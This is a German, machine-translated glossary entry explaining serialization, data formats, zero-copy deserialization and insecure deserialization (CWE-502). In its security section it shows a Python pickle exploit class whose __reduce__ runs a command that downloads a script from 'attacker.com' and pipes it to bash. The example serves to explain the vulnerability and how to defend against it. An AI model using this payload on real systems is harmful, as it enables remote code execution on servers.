# Was ist Serialization?

*Glossar · Dev · Zuletzt aktualisiert: 19. September 2026*

Unter Serialisierung versteht man die dynamische Zuordnung von Objekten, Datenstrukturen und Zeigergrafiken im Arbeitsspeicher (RAM) einer Programmiersprache; Dabei handelt es sich um den Prozess der Konvertierung von Daten in einen flachen, linearen Bytestrom oder ein Textformat, das über das Netzwerk übertragen oder auf der Festplatte gespeichert werden kann.

## Was bedeutet Serialisierung und warum ist sie notwendig? Speichermodell

In modernen Betriebssystemen läuft jeder Prozess in seinem eigenen isolierten virtuellen Adressraum. Ein Objekt zur Laufzeit; Es enthält lokale Variablen auf dem Stapel, dynamisch zugewiesene Speicherblöcke auf dem Heap, Funktionszeiger (vtable) und Referenzadressen (0x7ffee4b2...).

Diese Speicherstruktur kann aus zwei Hauptgründen nicht direkt auf ein anderes Medium kopiert werden:

1. Adressraumisolation: Speicherzeiger sind nur in der virtuellen Adresstabelle des aktuell ausgeführten Prozesses von Bedeutung. Wenn Sie einen Speicherzeiger an einen anderen Prozess auf demselben Server oder an einen Client im Netzwerk senden, kommt es auf dem Zielsystem zu einem ungültigen Speicherzugriff (Segmentierungsfehler) oder einer Speicherbeschädigung.
2. Architektur- und Endianness-Unterschiede: Unterschiedliche Prozessorarchitekturen (z. B. Little-Endian x86-64 vs. Big-Endian-Netzwerkhardware) halten Multibyte-Ganzzahlen und Gleitkommazahlen in unterschiedlicher Bytereihenfolge im Speicher. Darüber hinaus unterscheiden sich Zeigerbreiten und Datenausrichtungen (Ausrichtung/Padding) in 32-Bit- und 64-Bit-Systemen.

Serialisierungsmechanismus; Es durchläuft oder durchläuft den Objektgraphen im Speicher (einschließlich zyklischer Referenzen), wandelt lokale Zeiger in logische Beziehungen um und fügt die Daten in eine plattformunabhängige kanonische Bytesequenz ein.

***Analogie:** Ein Möbelstück zu bewegen ist, als würde man es auseinandernehmen und in eine flache, flache Kiste legen; Am Zielort öffnen Sie den Karton und bauen die Möbel anhand des Handbuchs wieder zusammen (Deserialisierung).*

## Serialisierungsformate: textbasiert vs. binär

Auswahl des richtigen Serialisierungsformats in der Softwarearchitektur; Es erfordert ein Gleichgewicht zwischen menschlicher Lesbarkeit, CPU-Parsing-Kosten, Netzwerkbandbreite und Typsicherheit.

- JSON (JavaScript Object Notation): Der De-facto-Standard der modernen Web- und RESTful-APIs. Es ist sprachunabhängig, wird nativ in Browsern unterstützt und ist für Entwickler leicht zu lesen und zu debuggen.
- Schwächen: Textbasiertes Parsing (Lexing, Tokenisierung, Konvertierung von Zeichenfolgen in Zahlen) verbraucht viel CPU. Wiederholte Schlüsselnamen (Feldschlüssel) in jedem Datensatz erzeugen unnötigen Nutzlast-Overhead. Außerdem erfordert die Übertragung von Binärdaten (z. B. ein Bild oder ein verschlüsselter Schlüssel) eine Base64-Kodierung; Dadurch erhöht sich die Datengröße um etwa 33 %.

- Protokollpuffer (Protobuf): Es handelt sich um ein von Google entwickeltes Binärformat, das das Rückgrat der gRPC- und Microservice-Kommunikation bildet. Es definiert Feldtypen und Feldnummern (Feld-Tags) mit einer soliden Schemadatei (.proto). Anstelle von Textschlüsseln werden numerische Beschriftungen und Ganzzahlkodierung variabler Länge (Varint) über das Netzwerk gesendet. Es verbraucht 3 bis 10 Mal weniger Bandbreite als JSON und analysiert viel schneller.
- Apache Avro: Im Big-Data-Ökosystem (Hadoop, Kafka) weit verbreitet. Das Schema wird in einer zentralen Registrierung (Schema Registry) gespeichert und ist nicht in jede Nachricht eingebettet. Dadurch wird die zusätzliche Belastung pro Nachricht minimiert.
- MessagePack und BSON: Speichert Daten in einem binär komprimierten Format und behält dabei das flexible, schemalose Schlüsselwertmodell von JSON bei.

## Zero-Copy-Deserialisierungsarchitektur

In klassischen Serialisierungsbibliotheken (JSON-Parser oder Standard-Protobuf) wird der Deserialisierungsprozess mit diesen Schritten durchgeführt:

1. Der vom Netzwerk-Socket kommende Bytestrom wird in einen temporären Puffer geschrieben.
2. Der Parser überprüft Typen durch Scannen von Bytes.
3. Für jedes Objekt, jede Zeichenfolge und jedes Array wird im Heap-Speicherbereich (malloc oder der Speichermanager der Sprache) neuer Speicher zugewiesen.
4. Werte werden aus dem Pufferspeicher in die neu erstellten Heap-Objekte kopiert.

In Systemen, in denen Hunderttausende Anfragen pro Sekunde verarbeitet werden, führen diese Heap-Zuweisungen und Kopiervorgänge zu einem hohen CPU-Verbrauch und zu Unterbrechungen des Garbage Collectors.

**Zero-Copy-Ansatz (FlatBuffers, Cap'n Proto):** Wenn Daten in diesen Bibliotheken serialisiert werden, werden sie entsprechend der Speicherausrichtung und den relativen Offsets im Binärpuffer abgelegt.

Während der Deserialisierungsphase erfolgt keine Speicherzuweisung oder Datenkopie. Die Anwendung ordnet (mmap) den eingehenden Bytepuffer direkt dem Speicher zu und greift über Zeigerarithmetik direkt auf Objektfelder zu. Die Deserialisierungszeit beträgt tatsächlich 0 Millisekunden. Diese Architektur; Es ist Standard im Hochfrequenzhandel (HFT), Edge Computing (Edge AI) und AAA-Game-Engines.

## Sicherheitsdimension: Unsichere Deserialisierung (CWE-502)

Es entstehen katastrophale Sicherheitslücken, wenn bei der Serialisierung versucht wird, Objektklassen und Laufzeitverhalten zu serialisieren, anstatt nur reine Daten zu verschieben. Unsichere Deserialisierung (Insecure Reverse Serialization), die in der OWASP-Top-10-Liste steht, ermöglicht es dem Angreifer, beliebigen Code (Remote Code Execution – RCE) auf dem System auszuführen.

Das in Python integrierte Serialisierungsmodul pickle serialisiert die __reduce__-Methode von Objekten. Diese Methode definiert eine Funktion und ihre Parameter, die während der Objektdeserialisierung aufgerufen werden sollen. Durch Missbrauch dieses Mechanismus kann ein Angreifer eine bösartige Bytesequenz generieren, die einen Betriebssystembefehl ausführt:

```
# Saldırgan tarafından hazırlanan zararlı serileştirme paketi
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('curl -s https://attacker.com/steal.sh | bash',))
```

Sobald dieser Bytestrom an den Server gesendet und pickle.loads(payload) ausgeführt wird, wird ein nicht autorisierter Shell-Befehl auf dem Server ausgeführt. Daher sollten Daten aus nicht vertrauenswürdigen Quellen nicht mit Pickle analysiert werden.

Im nativen Serialisierungsmechanismus von Java (ObjectInputStream.readObject()) lädt der Klassenlader die Klasse des eingehenden Objekts in den Speicher. Angreifer; Es kann eine Ausführungskette aufbauen, die Befehle im Speicher ausführt, indem es die Methoden von Klassen in auf dem System installierten Bibliotheken (z. B. Apache Commons Collections oder Spring Framework) verbindet (Gadget-Kette).

- Verwenden Sie niemals sprachintegrierte Formate, die ausführbaren Code oder Klassendefinitionen enthalten (Python Pickle, Java Native Serialization, PHP Unserialize), an Netzwerkgrenzen.
- Wählen Sie Formate, die nur reine Daten enthalten, und validieren Sie die Datenstruktur anhand des Schemas (JSON + Pydantic/Zod oder Protobuf).
- Implementieren Sie Authentifizierung und Nachrichtenintegritätskontrolle (HMAC oder TLS) beim binären Datenaustausch.

## Häufige Fragen

**Was ist der Hauptunterschied zwischen Serialisierung und Deserialisierung?**

Bei der Serialisierung werden lebende Objekte im Speicher in einen Byte-/Textstrom umgewandelt, der gespeichert oder übertragen werden kann. Bei der Deserialisierung wird diese Bytesequenz gelesen, analysiert und in ein Objekt umgewandelt, das im Speicher des Zielsystems funktioniert.

**Wann sollten Protobuf oder FlatBuffers anstelle von JSON in Webprojekten verwendet werden?**

Für öffentliche Web-Clients und öffentliche APIs ist JSON aufgrund seiner Browserkompatibilität und einfachen Debugging ideal. Für interne Microservices, mobile Anwendungs-Backends oder Echtzeit-Datenströme sollten jedoch Protobuf oder FlatBuffers bevorzugt werden, um die Netzwerkbandbreite zu drosseln und die Kosten für die CPU-Zerlegung zu senken.

**Wie funktioniert der Angriff „Insecure Deserialization“ und wie kann man ihn verhindern?**

Der Angreifer fügt schädliche Funktionen oder Klassenstrukturen in die serialisierten Daten ein, die während der Deserialisierung ausgeführt werden sollen. Wenn der Server diese Daten analysiert, können Systembefehle ausgelöst werden. To prevent this, formats that carry class logic should be abandoned and only schema formats that carry pure data (Protobuf, JSON Schema) should be used.

**Was bedeutet Zero-Copy-Deserialisierung?**

Dabei handelt es sich um eine Technik, bei der Daten direkt mit Zeigeroffsets im Pufferspeicher gelesen werden, anstatt den eingehenden Bytestrom durch Zuweisung neuer Speicherbereiche zu kopieren. Es entlastet den Prozessor und den Garbage Collector, indem es die Speicherzuweisung zurücksetzt.

**Was ist Schema-Evolution? Wie kann die Abwärts- und Vorwärtskompatibilität sichergestellt werden?**

Datenmodelle ändern sich, wenn die Software aktualisiert wird. Systeme wie Protobuf und Avro geben Feldern eindeutige numerische IDs, sodass alte Clients neue Felder ignorieren können (Abwärtskompatibilität) und neue Clients alte Daten mit Standardwerten lesen können (Vorwärtskompatibilität).

## Verwandte Begriffe

- [API](https://trescout.com/de/dictionary/api/)
- [Data Pipeline](https://trescout.com/de/dictionary/data-pipeline/)
- [Memory Management](https://trescout.com/de/dictionary/memory-management/)
- [Network Stack](https://trescout.com/de/dictionary/network-stack/)

## Verwandte Werkzeuge

- [YAML Cpp](https://trescout.com/de/discover/yaml-cpp/)

Diese Erklärung wurde für TreScout in einfacher Sprache verfasst und **maschinell übersetzt** aus dem türkischen Original · maßgeblich ist die türkische Fassung. Wenn etwas falsch oder unvollständig wirkt, schreiben Sie an [hello@trescout.com](mailto:hello@trescout.com). [Auf Türkisch lesen →](https://trescout.com/dictionary/serialization/)

---
Quelle: TreScout Glossar · https://trescout.com/de/dictionary/serialization/
